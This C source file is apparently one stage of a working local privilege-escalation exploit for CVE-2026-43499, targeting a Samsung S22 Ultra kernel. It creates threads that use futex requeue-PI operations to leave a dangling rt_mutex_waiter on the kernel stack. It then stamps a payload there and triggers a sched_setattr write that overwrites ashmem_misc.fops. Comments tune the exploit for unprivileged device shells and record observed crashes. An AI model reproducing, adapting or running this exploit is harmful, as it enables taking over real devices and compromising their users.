/*
 * exp32 — CVE-2026-43499 32-bit ARM stage (b0q / S22 Ultra, 5.10.226).
 *
 * Ported from IonStackQuest3 (eureka) — the b0q measurement (gdb-mcp,
 * live kernel) puts the stale rt_mutex_waiter at stamp buffer +0x58
 * (eureka used +0x34).  See exp32/stack.c.
 *
 * Built as armeabi-v7a static PIE and embedded into the 64-bit
 * preload binary (see src/exp32_blob.S). The 64-bit side writes it to
 * a guest-writable path and execve()s it with an inherited memfd
 * holding the 128-byte payload buffer:
 *
 *   argv[1] = decimal fd of the memfd (buffer: 16 uint64_t words)
 *
 * It MUST stay 32-bit: the kernel-stack corruption only lines up with
 * the 32-bit syscall entry (compat) path — verified against the b0q
 * kernel source (compat_group_source_req is 260 bytes packed; the
 * native group_source_req is 264 and rejects optlen=260 with EINVAL)
 * and against live frame measurements.
 */
#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#include "kernelsnitch/utils.h"

#ifndef pr_debug
#define pr_debug(fmt, ...) ((void)0)
#endif

/* ------------------------------------------------------------------ */
/*  Constants                                                          */
/* ------------------------------------------------------------------ */

#define WAITER_WAIT_SEC     5
/* The consumer fires with no settle delay by default
 * (EXP32_CONSUMER_DELAY_US overrides) — see consumer_thread. */
#define WAITER_RT_PRIO      99
#define CONSUMER_RT_PRIO    98

/* Payload: 16 uint64_t words = 128 bytes, written by exp_stack_once(). */
#define EXP_BUFFER_BYTES 128
#define EXP_BUFFER_WORDS (EXP_BUFFER_BYTES / sizeof(uint64_t))

/* ------------------------------------------------------------------ */
/*  Shared state                                                       */
/* ------------------------------------------------------------------ */

static uint32_t f_wait;
static uint32_t f_pi_target;
static uint32_t f_pi_chain;

static atomic_int g_waiter_tid;
static atomic_int g_waiter_ready;
static atomic_int g_waiter_waiting;
static atomic_int g_owner_started;
atomic_int g_consumer_go;
static atomic_int g_consumer_done;
static uint64_t g_payload_buffer[EXP_BUFFER_WORDS];

/*
 * sched_setattr ABI struct (same layout on 32-bit and 64-bit;
 * the kernel interprets it via the .size field).
 */
struct local_sched_attr {
    uint32_t size;
    uint32_t sched_policy;
    uint64_t sched_flags;
    int32_t  sched_nice;
    uint32_t sched_priority;
    uint64_t sched_runtime;
    uint64_t sched_deadline;
    uint64_t sched_period;
};

static long sched_setattr_rt(int tid, int rt_prio) {
    struct local_sched_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.size           = sizeof(attr);
    attr.sched_policy   = 1 /* SCHED_FIFO */;
    attr.sched_priority = rt_prio;
    return syscall(__NR_sched_setattr, tid, &attr, 0);
}

void do_stamp_stack(uint64_t *buf);

/* ------------------------------------------------------------------ */
/*  Thread: waiter                                                     */
/* ------------------------------------------------------------------ */

static void *waiter_thread(void *arg __attribute__((unused))) {
    pin_to_core(2);
    int tid = (int)syscall(__NR_gettid);
    atomic_store(&g_waiter_tid, tid);

    /*
     * FIFO preset is opt-in (EXP32_RT=1, e.g. QEMU-root runs).  Default is
     * the unprivileged-device path: the waiter stays in CFS.  The FIFO
     * guards against a CFS task being tick-preempted while parked in its
     * userspace spin — __schedule/put_prev_entity frames reuse its kernel
     * stack and land on the stale waiter (observed under TCG: PAC-signed
     * put_prev_entity LR in waiter->lock).  On real hardware the parked
     * window is microseconds, and each attempt runs in a fresh child, so
     * the residual race is covered by retries.  Must happen before any
     * futex op: once pi_blocked_on exists, a priority change on this task
     * would itself trigger the chain walk.
     */
    if (getenv("EXP32_RT")) {
        struct local_sched_attr rt = {
            .size           = sizeof(rt),
            .sched_policy   = 1 /* SCHED_FIFO */,
            .sched_priority = WAITER_RT_PRIO,
        };
        syscall(__NR_sched_setattr, 0, &rt, 0);
    }

    /* Step 1: lock pi_chain (become PI owner of pi_chain). */
    if (syscall(__NR_futex, &f_pi_chain, FUTEX_LOCK_PI, 0,
                NULL, NULL, 0) != 0) {
        pr_warning("waiter: LOCK_PI(chain) failed errno=%d\n", errno);
        return NULL;
    }

    atomic_store(&g_waiter_ready, 1);

    /* Wait for owner to lock pi_target and block on pi_chain. */
    while (!atomic_load(&g_owner_started))
        usleep(1000);

    /* Step 2: FUTEX_WAIT_REQUEUE_PI.
     * This allocates rt_mutex_waiter on our kernel stack and sets
     * our ->pi_blocked_on to point at it.
     */
    struct timespec timeout;
    syscall(__NR_clock_gettime, CLOCK_MONOTONIC, &timeout);
    timeout.tv_sec += WAITER_WAIT_SEC;

    atomic_store(&g_waiter_waiting, 1);

    pr_info("waiter: FUTEX_WAIT_REQUEUE_PI on f_wait -> pi_target\n");
    syscall(__NR_futex, &f_wait, FUTEX_WAIT_REQUEUE_PI, 0,
            &timeout, &f_pi_target, 0);
    pr_debug("waiter: returned from WRPI (errno=%d should be 110(ETIMEDOUT))\n",
             errno);

    /* Step 3: unlock pi_chain.  After this, pi_blocked_on is STILL
     * dangling (the bug: CMP_REQUEUE_PI cleaned main's, not ours).
     */
    syscall(__NR_futex, &f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);

    /* Step 4: stamp our own kernel stack with the payload buffer. */
    do_stamp_stack(g_payload_buffer);

    /* Keep alive so the consumer can find our TID. */
    while (1)
        sleep(1);

    return NULL;
}

/* ------------------------------------------------------------------ */
/*  Thread: owner                                                      */
/* ------------------------------------------------------------------ */

static void *owner_thread(void *arg __attribute__((unused))) {
    /* Lock pi_target first. */
    if (syscall(__NR_futex, &f_pi_target, FUTEX_LOCK_PI, 0,
                NULL, NULL, 0) != 0) {
        pr_warning("owner: LOCK_PI(target) failed errno=%d\n", errno);
        return NULL;
    }

    while (!atomic_load(&g_waiter_ready))
        usleep(1000);

    atomic_store(&g_owner_started, 1);

    /* Try to lock pi_chain -- blocks because waiter holds it.
     * This creates the lock chain needed for the deadlock.
     */
    pr_debug("owner: LOCK_PI(chain) -- will block\n");
    syscall(__NR_futex, &f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    pr_debug("owner: LOCK_PI(chain) acquired\n");

    while (1)
        sleep(1);
    return NULL;
}

/* ------------------------------------------------------------------ */
/*  Thread: consumer                                                   */
/* ------------------------------------------------------------------ */

static void *consumer_thread(void *arg __attribute__((unused))) {
    pin_to_core(3);
    int tid = 0;
    while (!(tid = atomic_load(&g_waiter_tid)))
        usleep(1000);

    while (!atomic_load(&g_consumer_go))
        ;

    /* Fire IMMEDIATELY: the payload is fully stamped and parked before
     * g_consumer_go is set, so a settle delay buys nothing — and every
     * microsecond of it is pure exposure for the parked CFS waiter (no
     * RT privilege on device shell): a tick preemption inside the window
     * reuses its kernel stack and tears the payload (device panic:
     * waiter->lock=1 at rt_mutex_adjust_prio_chain+388).  The old 15ms
     * delay guaranteed that clobber on a busy device.  Tunable via
     * EXP32_CONSUMER_DELAY_US for experiments. */
    {
        const char *d = getenv("EXP32_CONSUMER_DELAY_US");
        long delay_us = d ? atol(d) : 0;
        if (delay_us > 0)
            usleep(delay_us);
    }

    if (!atomic_load(&g_consumer_go)) {
        pr_warning("consumer: missed the window\n");
        return NULL;
    }

    /*
     * Trigger: an RT-priority DROP (FIFO 99 -> 98) on the waiter:
     * sched_setattr -> __sched_setscheduler -> rt_mutex_adjust_pi
     * -> rt_mutex_adjust_prio_chain step [7] rt_mutex_dequeue(lock, waiter)
     * -> rb_erase_cached(&waiter->tree_entry, &fake_lock->waiters)
     * -> rb_set_parent(child=rb_left, parent=pc&~3) writes fake_fops
     *    into ashmem_misc.fops (see b0q rtmutex.c:663).
     * The waiter STAYS in RT class the whole time — a CFS transition
     * (SCHED_BATCH) would let the tick preempt it inside sched_setattr's
     * own window and clobber the parked payload (put_prev_entity LR in
     * waiter->lock, observed twice).
     */
    pr_debug("consumer: calling sched_setattr on TID %d\n", tid);
    long ret;
    if (getenv("EXP32_RT")) {
        /* RT-priority DROP (FIFO 99 -> 98): the QEMU-root trigger; the
         * waiter stays in RT class, so no tick can clobber the parked
         * payload inside sched_setattr's window (TCG stretches it). */
        ret = sched_setattr_rt(tid, CONSUMER_RT_PRIO);
    } else {
        /* Default trigger — works unprivileged (device shell): any
         * sched_setattr runs rt_mutex_adjust_pi() on the target (b0q
         * sched/core.c:5784 pi=true).  A CFS nice bump needs no privilege
         * and is a REAL change (fresh child per attempt: nice 0 -> 1), so
         * the no-op early return can't skip the pi walk. */
        struct local_sched_attr attr;
        memset(&attr, 0, sizeof(attr));
        attr.size           = sizeof(attr);
        attr.sched_policy   = 0 /* SCHED_OTHER */;
        attr.sched_nice     = 1;
        ret = syscall(__NR_sched_setattr, tid, &attr, 0);
        if (ret != 0 && errno == EPERM)
            ret = sched_setattr_rt(tid, CONSUMER_RT_PRIO);
    }
    pr_info("consumer: trigger ret=%ld errno=%d (%s)\n", ret, errno,
            getenv("EXP32_RT") ? "rt-drop" : "cfs-nice");

    atomic_store(&g_consumer_done, 1);

    while (1)
        sleep(1);
    return NULL;
}

/* ------------------------------------------------------------------ */
/*  main                                                               */
/* ------------------------------------------------------------------ */

int main(int argc, char **argv) {
    if (argc < 2) {
        pr_warning("usage: %s <buffer_fd>\n", argv[0]);
        return 1;
    }

    /* Read the payload from the inherited memfd (see exp_stack_once). */
    int buf_fd = atoi(argv[1]);
    ssize_t n = pread(buf_fd, g_payload_buffer, EXP_BUFFER_BYTES, 0);
    if (n != EXP_BUFFER_BYTES) {
        pr_warning("buffer fd %d unreadable: pread=%zd errno=%d\n",
                   buf_fd, n, errno);
        return 1;
    }

    pr_info("CVE-2026-43499 32-bit ARM stage (b0q) pid=%d\n", getpid());

    pthread_t waiter, owner, consumer;

    pthread_create(&waiter,   NULL, waiter_thread,   NULL);
    pthread_create(&owner,    NULL, owner_thread,    NULL);
    pthread_create(&consumer, NULL, consumer_thread, NULL);

    /* Wait until waiter is inside FUTEX_WAIT_REQUEUE_PI and owner
     * has started (blocked on pi_chain).
     */
    while (!atomic_load(&g_waiter_waiting) ||
           !atomic_load(&g_owner_started))
        usleep(1000);

    /* Give the scheduler a moment to settle. */
    usleep(200000);

    /*
     * Trigger the deadlock -- CMP_REQUEUE_PI with val=1.
     *
     * This causes rt_mutex_start_proxy_lock to clean the WRONG thread's
     * pi_blocked_on, leaving the waiter's dangling to its kernel stack.
     */
    pr_info("main: FUTEX_CMP_REQUEUE_PI on f_wait -> pi_target\n");
    errno = 0;
    syscall(__NR_futex, &f_wait, FUTEX_CMP_REQUEUE_PI, 1,
            (void *)1, &f_pi_target, 0);
    pr_debug("main: CMP_REQUEUE_PI returned (errno=%d should be 35(EDEADLK))\n",
             errno);

    /* Wait for the exploit chain to finish (or crash). */
    while (!atomic_load(&g_consumer_done))
        sleep(1);

    pr_info("main: exploit chain complete.\n");
    return 0;
}
